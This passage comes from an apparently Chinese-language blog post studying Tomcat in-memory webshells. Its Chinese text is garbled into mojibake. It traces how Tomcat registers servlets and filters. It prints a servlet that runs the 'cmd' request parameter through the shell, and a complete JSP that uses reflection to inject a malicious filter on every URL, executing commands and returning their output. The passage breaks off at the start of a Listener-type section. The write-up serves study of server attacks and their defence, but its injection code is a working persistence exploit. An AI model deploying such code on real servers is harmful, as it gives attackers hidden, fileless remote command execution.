class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig servletConfig)</span> &#123;&#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> servletRequest.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        &#123;<br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(<span class="hljs-string">&quot;cmd /c &quot;</span> + cmd).getInputStream();<br>            <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in, <span class="hljs-string">&quot;GBK&quot;</span>).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br>            servletResponse.setCharacterEncoding(<span class="hljs-string">&quot;GBK&quot;</span>);<br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> servletResponse.getWriter();<br>            out.println(output);<br>            out.flush();<br>            out.close();<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>ä»–è¿™é‡Œä½¿ç”¨<code>cmd /c</code>æ¥å®ç°å¯ä»¥æ‰§è¡Œå¸¦æœ‰ç©ºæ ¼çš„å‘½ä»¤ï¼Œä¾‹å¦‚<code>echo ä¸–ç•Œï¼Œä½ å¥½ï¼</code>ï¼›å¯¹äºLinuxç³»ç»Ÿï¼Œé‚£å°±æ˜¯<code>/bin/sh -c</code></p><blockquote><p>è‡³äºLoadOnStartUpè¿™ä¸ªç©æ„æ²¡å‘ç°ä»–çš„ä½œç”¨æš‚æ—¶</p></blockquote><p><strong>å…³äºå®ä¾‹åŒ–servletçš„æ·»åŠ </strong></p><p>å› ä¸ºæ‡’åŠ è½½æœºåˆ¶æˆ‘ä»¬æ˜¯åœ¨è®¿é—®åæ‰è¿›è¡Œçš„å®ä¾‹åŒ–servletï¼Œç„¶åæˆ‘å°±æƒ³æ¢ç©¶ä¸€ä¸‹è¿™ä¸ªservletåˆ°åº•æ˜¯åœ¨å“ªé‡Œè¢«å®ä¾‹åŒ–ç„¶åæ·»åŠ åˆ°wrapperé‡Œé¢ï¼Œä½†æˆ‘è°ƒäº†å¾ˆä¹…ä¹Ÿæ²¡æœ‰å‘ç°æ”¾è¿›wrapperçš„åœ°æ–¹</p><p><img src="https://cdn.clown2024.cn/202409192045616.png" alt="image-20240919204457080"></p><p>æˆ‘è¿™é‡Œæ‰¾åˆ°çš„è°ƒç”¨StandardWrapper#allocate()æ¥å®ä¾‹åŒ–ä¸€ä¸ªservletï¼Œç„¶åå¾€ä¸‹æœ‰ä¸ªcreateFilterChainå‡½æ•°ï¼Œä»–å°†servletä¼ é€’äº†è¿›å»ï¼Œæˆ‘å°±å»çœ‹äº†ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202409192050093.png" alt="image-20240919205001955"></p><p>ç„¶ååªæœ‰è¿™é‡Œæ˜¯å°†å®ä¾‹æ·»åŠ è¿›äº†filterchainï¼Œæ­¤æ—¶æˆ‘è¿˜æ˜¯æ²¡çœ‹åˆ°å¦‚expé‡Œé¢çš„è¦å°†servletæ”¾è¿›wrapperé‡Œé¢</p><p><img src="https://cdn.clown2024.cn/202409192054750.png" alt="image-20240919205426641"></p><p>æœ€åæ‰§è¡Œåˆ°servletçš„æ—¶å€™å°±æ˜¯åœ¨doFilteræ–¹æ³•é‡Œé¢è°ƒç”¨servletå±æ€§çš„serviceæ–¹æ³•ï¼Œç„¶ååˆ°servletçš„doGetæ–¹æ³•é‡Œäº†</p><p>åæ¥ç»ˆäºæƒ³é€šäº†ï¼Œçœ‹ä»£ç å¤ªä¸ç»†è‡´è¿˜æ˜¯æ¼äº†å…³é”®çš„åœ°æ–¹ï¼Œæˆ‘åœ¨è®¿é—®å†…å­˜é©¬é¡µé¢ä¹‹åå†è°ƒè¯•å›åˆ°é‚£ä¸ªallocateæ–¹æ³•é‡Œé¢ï¼Œå‘ç°æˆ‘ä»¬è®¾ç½®äº†å®ä¾‹ä¹‹åä»–çš„åˆ¤æ–­é€»è¾‘å°±ä¸åŒäº†</p><p><img src="https://cdn.clown2024.cn/202409192108171.png" alt="image-20240919210819062"></p><p>å› ä¸ºæˆ‘ä»¬è®¾ç½®äº†instanceï¼Œè¿™éƒ¨åˆ†çš„é€»è¾‘å°±è¢«è·³è¿‡äº†ï¼Œç„¶åå°±ä¼šåˆ°ä¸‹é¢è¿™é‡Œ</p><p><img src="https://cdn.clown2024.cn/202409192109478.png" alt="image-20240919210910379"></p><p>ç›´æ¥è¿”å›æˆ‘ä»¬è®¾ç½®çš„instanceï¼Œç„¶åå†æ”¾è¿›äº†filterchainé‡Œé¢ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦ç”¨wrapper.setServletæ–¹æ³•çš„åŸå› </p><p>æ‰€ä»¥å…¶å®æˆ‘åœ¨æƒ³å¦‚æœèƒ½å¤Ÿè·å–filterChainçš„è¯ç›´æ¥æ·»åŠ æ•ˆæœåº”è¯¥ä¹Ÿæ˜¯ä¸€æ ·çš„</p><h1><span id="filterå†…å­˜é©¬">Filterå†…å­˜é©¬</span></h1><p>è¿™éƒ¨åˆ†å‚è€ƒæ–‡ç« ï¼š<a href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Filter%E5%9E%8B/%EF%BC%8Chttps://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/">https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Filter%E5%9E%8B/ï¼Œhttps://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/</a></p><p>å†™Filterå†…å­˜é©¬çš„æ­¥éª¤ï¼š</p><ul><li>è·å–StandardContextï¼›</li><li>ç»§æ‰¿å¹¶ç¼–å†™ä¸€ä¸ªæ¶æ„filterï¼›</li><li>å®ä¾‹åŒ–ä¸€ä¸ªFilterDefç±»ï¼ŒåŒ…è£…filterå¹¶å­˜æ”¾åˆ°<code>StandardContext.filterDefs</code>ä¸­ï¼›</li><li>å®ä¾‹åŒ–ä¸€ä¸ªFilterMapç±»ï¼Œå°†æˆ‘ä»¬çš„Filterå’Œurlpatternç›¸å¯¹åº”ï¼Œä½¿ç”¨addFilterMapBeforeå­˜æ”¾åˆ°StandardContext.filterMapsä¸­ï¼›</li><li>é€šè¿‡åå°„è·å–filterConfigsï¼Œå®ä¾‹åŒ–ä¸€ä¸ª<code>FilterConfig</code>ï¼ˆ<code>ApplicationFilterConfig</code>ï¼‰ç±»ï¼Œä¼ å…¥<code>StandardContext</code>ä¸<code>filterDefs</code>ï¼Œå­˜æ”¾åˆ°filterConfigä¸­ã€‚</li></ul><p>æœ‰å…³filterç›¸å…³çš„å†…å®¹å¯ä»¥çœ‹ä¸€ä¸‹é‡Œé¢æ–‡ç« çš„æ€»ç»“ã€‚</p><h2><span id="åŸç†åˆ†æ">åŸç†åˆ†æ</span></h2><p>è¿™é‡Œå¼€å§‹å…ˆåˆ†æå†å†™</p><p>filteræˆ‘ä»¬çŸ¥é“å°±æ˜¯servletå‰çš„ä¸€ä¸ªè¿‡æ»¤å™¨ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦å®ç°ä¸€ä¸ªfilterå¹¶å†™æ¶æ„ä»£ç ï¼Œç„¶åæ·»åŠ è¿›å»å³å¯</p><p><strong>äº†è§£ä¸€ä¸‹æœ‰å…³filterçš„å„ä¸ªåè¯</strong></p><ul><li>FilterDefsï¼šé¦–å…ˆï¼Œéœ€è¦å®šä¹‰è¿‡æ»¤å™¨FilterDefï¼Œå­˜æ”¾è¿™äº›FilterDefçš„æ•°ç»„è¢«ç§°ä¸ºFilterDefsï¼Œæ¯ä¸ªFilterDefå®šä¹‰äº†ä¸€ä¸ªå…·ä½“çš„è¿‡æ»¤å™¨ï¼ŒåŒ…æ‹¬æè¿°ä¿¡æ¯ã€åç§°ã€è¿‡æ»¤å™¨å®ä¾‹ä»¥åŠclassç­‰ã€‚</li><li>FilterConfigsï¼šæ˜¯è¿™äº›è¿‡æ»¤å™¨çš„å…·ä½“é…ç½®å®ä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥ä¸ºæ¯ä¸ªè¿‡æ»¤å™¨å®šä¹‰å…·ä½“çš„é…ç½®å‚æ•°ï¼Œä»¥æ»¡è¶³ç³»ç»Ÿçš„éœ€æ±‚ã€‚</li><li>FilterMapsï¼šç”¨äºå°†FilterConfigsæ˜ å°„åˆ°å…·ä½“çš„è¯·æ±‚è·¯å¾„æˆ–å…¶ä»–æ ‡è¯†ä¸Šï¼Œè¿™æ ·ç³»ç»Ÿåœ¨å¤„ç†è¯·æ±‚æ—¶å°±èƒ½å¤Ÿæ ¹æ®è¯·æ±‚çš„è·¯å¾„æˆ–æ ‡è¯†æ‰¾åˆ°å¯¹åº”çš„FilterConfigsã€‚</li><li>FilterChainï¼šæ˜¯ç”±å¤šä¸ªFilterConfigsç»„æˆçš„é“¾å¼ç»“æ„ï¼Œå®ƒå®šä¹‰äº†è¿‡æ»¤å™¨çš„æ‰§è¡Œé¡ºåºï¼Œåœ¨å¤„ç†è¯·æ±‚æ—¶ç³»ç»Ÿä¼šæŒ‰ç…§FilterChainä¸­çš„é¡ºåºä¾æ¬¡æ‰§è¡Œæ¯ä¸ªè¿‡æ»¤å™¨ï¼Œå¯¹è¯·æ±‚è¿›è¡Œè¿‡æ»¤å’Œå¤„ç†ã€‚</li></ul><p><strong>è®¿é—®ç½‘é¡µå‰çš„filteræ·»åŠ </strong></p><p>åŒæ ·çš„filterçš„æ·»åŠ ä¹Ÿåœ¨æˆ‘ä»¬ä¹‹å‰è¯´åˆ°çš„ContextConfig#configureContexté‡Œé¢</p><p><img src="https://cdn.clown2024.cn/202409161922576.png" alt="image-20240916192256483"></p><p>è¿™é‡Œå¾€contexté‡Œé¢æ·»åŠ filterdefï¼Œå…·ä½“ä»£ç å¦‚ä¸‹</p><p><img src="https://cdn.clown2024.cn/202409161924392.png" alt="image-20240916192439333"></p><p>æ·»åŠ åˆ°ä¸€ä¸ªhashMapé‡Œé¢ï¼Œä¸‹é¢æ˜¯filterDefçš„ç›¸å…³å±æ€§</p><p><img src="https://cdn.clown2024.cn/202409192131516.png" alt="image-20240919213120425"></p><p>æœ‰äº›å±æ€§æ˜¯æˆ‘ä»¬åˆ°æ—¶å€™åˆ›å»ºçš„æ—¶å€™éœ€è¦è®¾ç½®çš„</p><p><img src="https://cdn.clown2024.cn/202409161925478.png" alt="image-20240916192510416"></p><p>è¿™é‡Œæ˜¯æ·»åŠ filterMapè¿›å»ï¼Œå†çœ‹ä¸€ä¸‹filterMapé‡Œç›¸å…³çš„å±æ€§</p><p><img src="https://cdn.clown2024.cn/202409192133213.png" alt="image-20240919213313122"></p><p>è¿™å°±æ˜¯è®¿é—®è·¯ç”±å‰çš„æ³¨å†Œå†…å®¹</p><p><strong>è®¿é—®ä¹‹å</strong></p><p>ç°åœ¨æˆ‘ä»¬å†™ä¸€ä¸ªfilterç±»ï¼Œç„¶åæ–­åœ¨doFilteræ–¹æ³•ï¼Œçœ‹ä¸€ä¸‹æ‰§è¡Œçš„è¿‡ç¨‹</p><blockquote><p>è¿™é‡Œçš„chain.doFilteræ˜¯ä¸€å®šè¦å†™çš„ä¸ç„¶å°±èµ°ä¸åˆ°servleté‚£é‡Œäº†ï¼Œå› ä¸ºéå†doFilterä¹‹åï¼Œæœ€ç»ˆæ˜¯åœ¨servletService()æ–¹æ³•ä¸­èµ°åˆ°request</p></blockquote><p><img src="https://cdn.clown2024.cn/202409192135120.png" alt="image-20240919213506978"></p><p>è§‚å¯Ÿä¸€ä¸‹ä»–çš„è°ƒç”¨æ ˆï¼Œå¯ä»¥çœ‹åˆ°æ˜¯ä»StandardWrapperValve#invokeè¿‡æ¥çš„ï¼Œæˆ‘ä»¬å»çœ‹ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202409170050633.png" alt="image-20240917005012554"></p><p>æ‰€ä»¥å¯ä»¥çŸ¥é“æ˜¯åœ¨filterChainçš„doFilteræ–¹æ³•é‡Œé¢æ‰§è¡Œæˆ‘ä»¬çš„filterå’Œservlet</p><p>ç„¶ååœ¨æ‰¾ä¸€ä¸‹filterChainæ˜¯åœ¨å“ªåˆ›å»ºçš„</p><p><img src="https://cdn.clown2024.cn/202409170052061.png" alt="image-20240917005252976"></p><p>å¯ä»¥çœ‹åˆ°æ˜¯åœ¨è¿™é‡Œï¼Œæ¥ä¸‹æ¥é‡æ–°ä¸‹æ–­ç‚¹åˆ°è¿™ï¼Œçœ‹ä¸€ä¸‹filterChainçš„åˆ›å»º</p><p><img src="https://cdn.clown2024.cn/202409192140374.png" alt="image-20240919214048265"></p><p>è¿™é‡Œå…ˆåˆ›å»ºäº†ä¸€ä¸ªApplicationFilterChainç„¶åçœ‹èƒ½å¦ä»reqä¸­è·å–filterChainï¼Œä¸èƒ½å°±æ–°å»ºä¸€ä¸ªApplicationFilterChainåŒæ—¶setç»™reqï¼Œç»§ç»­å¾€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202409170101254.png" alt="image-20240917010128142"></p><p>ç„¶åå°±æ˜¯è·å–standardContextå†ä»ä¸­è·å–filterMapsï¼Œç„¶åçœ‹ä¸€ä¸‹ç°åœ¨filterMapsé‡Œé¢çš„å†…å®¹</p><p><img src="https://cdn.clown2024.cn/202409192144379.png" alt="image-20240919214407244"></p><p>å¯ä»¥çœ‹åˆ°æœ‰æœ‰æˆ‘ä»¬è‡ªå·±çš„é‚£ä¸ªFilterMap</p><p><img src="https://cdn.clown2024.cn/202409170106138.png" alt="image-20240917010647039"></p><p>æ¥ä¸‹æ¥ä¼šéå†filterMaps ä¸­çš„ filterMapçš„filterNameï¼Œå¦‚æœå‘ç°ç¬¦åˆå½“å‰è¯·æ±‚ url ä¸ filterMap ä¸­çš„ urlPattern åŒ¹é…ä¸”é€šè¿‡filterNameèƒ½æ‰¾åˆ°å¯¹åº”çš„filterConfigï¼Œåˆ™ä¼šå°†å…¶åŠ å…¥filterChain</p><p>é‚£æ¥çœ‹ä¸€ä¸‹ApplicationFilterConfigçš„åˆ›å»º</p><p><img src="https://cdn.clown2024.cn/202409192148887.png" alt="image-20240919214844764"></p><p>å¯ä»¥çœ‹åˆ°ä»StandardContextçš„filterConfigsé‡Œé¢ç›´æ¥æ ¹æ®keyè·å–ApplicationFilterConfigçš„å®ä¾‹</p><p>æœ€åçœ‹ä¸€ä¸‹filterConfigçš„å†…å®¹</p><p><img src="https://cdn.clown2024.cn/202409192151525.png" alt="image-20240919215145392"></p><p>åŒ…å«äº†filterå®ä¾‹å’ŒfilterDefè¿˜æœ‰contextè¿™å‡ ä¸ªé‡è¦å…ƒç´ ï¼Œåˆ°æ­¤filterChainåˆ›å»ºå®Œæˆï¼Œç„¶åå°±æ˜¯æ‰§è¡Œå‰é¢è¯´çš„çš„doFilteræ–¹æ³•</p><h2><span id="å†…å­˜é©¬ç¼–å†™">å†…å­˜é©¬ç¼–å†™</span></h2><p>å‰é¢åˆ†æå¯çŸ¥ï¼Œæœ€é‡è¦çš„ä¸¤ä¸ªæ–¹æ³•æ˜¯**StandardContext.findFilterMaps()<strong>å’Œ</strong>StandardContext.findFilterConfig()**ï¼Œæˆ‘ä»¬åªè¦å¾€è¿™2ä¸ªå±æ€§é‡Œé¢æ’å…¥å¯¹åº”çš„filterMapå’ŒfilterConfigå³å¯å®ç°åŠ¨æ€æ·»åŠ filterçš„ç›®çš„ï¼Œè¿™äº›å±æ€§éƒ½åœ¨standardContexté‡Œé¢ï¼Œé‚£ä¹ˆstandardContexté‡Œé¢æ˜¯å¦ä¹Ÿæœ‰æ·»åŠ è¿™äº›å±æ€§çš„æ–¹æ³•å‘¢</p><p>è¿™é‡ŒstandardContextæä¾›äº†æ·»åŠ filterMapçš„æ–¹æ³•<strong>addFilterMapBefore</strong></p><p><img src="https://cdn.clown2024.cn/202409170136347.png" alt="image-20240917013619268"></p><p>è¿™é‡Œä¼šå…ˆæ ¡éªŒï¼Œç„¶åå†æ·»åŠ filterMapï¼Œè·Ÿè¿›ä¸€ä¸‹validateFilterMapæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409170138616.png" alt="image-20240917013804538"></p><p>å¯ä»¥çœ‹åˆ°å®ƒä¼šæ ¹æ®filterNameå»å¯»æ‰¾å¯¹åº”çš„filterDefï¼Œå¦‚æœæ²¡æ‰¾åˆ°çš„è¯ä¼šç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¿˜éœ€è¦å¾€filterDefsé‡Œæ·»åŠ filterDefã€‚</p><p>å…³äºfilterDefsï¼ŒStandardContextä¹Ÿç›´æ¥æä¾›äº†å¯¹åº”çš„æ·»åŠ æ–¹æ³•addFilterDef</p><p><img src="https://cdn.clown2024.cn/202409170140748.png" alt="image-20240917014031687"></p><p>æœ€åfilterConfigå¹¶æ²¡æœ‰æ·»åŠ è¯¥å±æ€§çš„æ–¹æ³•ï¼Œéœ€è¦æˆ‘ä»¬é€šè¿‡åå°„è·å–å±æ€§è¿›è¡Œä¿®æ”¹</p><p><img src="https://cdn.clown2024.cn/202409170142816.png" alt="image-20240917014218759"></p><p>ç°åœ¨å¤§éƒ¨åˆ†çš„é—®é¢˜æˆ‘ä»¬éƒ½è§£å†³äº†</p><p>ä¸‹é¢æ˜¯å…·ä½“çš„ä»£ç å®ç°</p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Map&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Context&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%!<br><br>%&gt;<br>&lt;%<br>    <span class="hljs-comment">// è·å–StandardContext</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">appctx</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    appctx.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appctx.get(servletContext);<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">stdctx</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    stdctx.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) stdctx.get(applicationContext);<br><br><br>    <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªfilterå®ä¾‹</span><br>    Filter evilFilter=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Filter</span>() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            <span class="hljs-keyword">if</span> (request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>                <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/C&quot;</span>, request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).start();<br>                <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> process.getInputStream().read(bytes);<br>                <span class="hljs-comment">//å°†å‘½ä»¤å›æ˜¾å†™å…¥åˆ°responseé‡Œé¢å»</span><br>                response.getWriter().write(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes, <span class="hljs-number">0</span>, len));<br>                process.destroy();<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>            <span class="hljs-comment">//å»æ‰§è¡ŒdoFilteræ–¹æ³•</span><br>            chain.doFilter(request,response);<br>        &#125;<br>    &#125;;<br>    <span class="hljs-comment">// FilterDef</span><br>    <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>    filterDef.setFilterName(<span class="hljs-string">&quot;clown&quot;</span>);<br>    filterDef.setFilterClass(evilFilter.getClass().getName());<br>    <span class="hljs-comment">//è¿™é‡Œä¼°è®¡ä¹Ÿæ˜¯åœ¨å®ä¾‹åŒ–filterçš„æ—¶å€™å¦‚æœfilterDefè®¾ç½®äº†å°±ç›´æ¥è¿”å›filterï¼Œå› ä¸ºè°ƒè¯•çš„æ—¶å€™filterDefé‡Œé¢æ­£å¸¸ä¹Ÿæ˜¯æ²¡æœ‰filterå®ä¾‹çš„</span><br>    filterDef.setFilter(evilFilter);<br>    <span class="hljs-comment">//æ·»åŠ FilterDef</span><br>    standardContext.addFilterDef(filterDef);<br><br>    <span class="hljs-comment">// FilterMap</span><br>    <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>    filterMap.setFilterName(<span class="hljs-string">&quot;clown&quot;</span>);<br>    filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>    filterMap.setDispatcher(DispatcherType.REQUEST.name());<br>    <span class="hljs-comment">//æ·»åŠ FilterMap</span><br>    standardContext.addFilterMapBefore(filterMap);<br><br>    <span class="hljs-comment">// è·å–filterConfigs</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">Configs</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>    Configs.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) Configs.get(standardContext);<br><br>    <span class="hljs-comment">//åˆ›å»ºApplicationFilterConfig</span><br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);<br>    constructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);<span class="hljs-comment">//å°†contextå’ŒfilterDefæ·»åŠ è¿›å»</span><br>    filterConfigs.put(<span class="hljs-string">&quot;clown&quot;</span>,filterConfig);<br><br>    out.print(<span class="hljs-string">&quot;Inject Success !&quot;</span>);<br><br><br><br>%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409170203799.png" alt="image-20240917020309726"></p><p><img src="https://cdn.clown2024.cn/202409192246438.png" alt="image-20240919224412807"></p><p>æˆåŠŸï¼</p><blockquote><p>è¿˜æœ‰expä¸­çš„è¿™è¡Œä»£ç filterMap.setDispatcher(DispatcherType.REQUEST.name());</p><p>æˆ‘æœäº†ä¸€ä¸‹å®ƒæ˜¯å®šä¹‰äº†è¿‡æ»¤å™¨å¯ä»¥ä»‹å…¥çš„å‡ ç§è¯·æ±‚ç±»å‹ã€‚è¿™äº›ç±»å‹åŒ…æ‹¬ï¼š</p><ul><li><code>REQUEST</code>ï¼šæ™®é€šçš„å®¢æˆ·ç«¯è¯·æ±‚ã€‚</li><li><code>FORWARD</code>ï¼šé€šè¿‡ <code>RequestDispatcher</code> è½¬å‘çš„è¯·æ±‚ã€‚</li><li><code>INCLUDE</code>ï¼šé€šè¿‡ JSP åŒ…å«æŒ‡ä»¤åŒ…å«çš„èµ„æºã€‚</li><li><code>ERROR</code>ï¼šä½œä¸ºé”™è¯¯é¡µé¢è¯·æ±‚ã€‚</li></ul><p>æ‰€ä»¥è¿™è¡Œä»£ç ä¸æ˜¯å¿…é¡»çš„ï¼Œåˆ æ‰ä¹Ÿä¸€æ ·å¯ä»¥</p><p>è€Œä¸”è¿™è¡Œä»£ç åªæ”¯æŒTomcat 7.x ä»¥ä¸Šï¼Œå› ä¸ºjavax.servlet.DispatcherType ç±»æ˜¯servlet 3 ä»¥åå¼•å…¥ï¼Œè€Œ Tomcat 7ä»¥ä¸Šæ‰æ”¯æŒ Servlet 3</p></blockquote><h1><span id="listenerå†…å­˜é©¬">Listenerå†…å­˜é©¬</span></h1><p>listenerå°±æ˜¯äº‹ä»¶ç›‘å¬ï¼Œjavaæœ‰å¾ˆå¤šä¸­listener</p><p><img src="https://cdn.clown2024.cn/202409182314209.png" alt="image-20240918230547084"></p><p>å¤§éƒ½æ˜¯ç»§æ‰¿è‡ªEventListeneræ¥å£ï¼Œè¿™é‡Œç”¨ServletRequestListenerï¼Œä»–æœ‰ä¸‹é¢çš„ä¸¤ä¸ªæ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1.void requestInitialized(ServletRequestEvent sre)ï¼š<br>è¿™ä¸ªæ–¹æ³•åœ¨ Servlet è¯·æ±‚å¯¹è±¡è¢«åˆ›å»ºå¹¶ä¸”è¿˜æ²¡æœ‰è¢«ä½¿ç”¨ä¹‹å‰è¢«è°ƒç”¨ã€‚è¿™é€šå¸¸å‘ç”Ÿåœ¨ä¸€ä¸ª HTTP è¯·æ±‚åˆ°è¾¾ Servlet 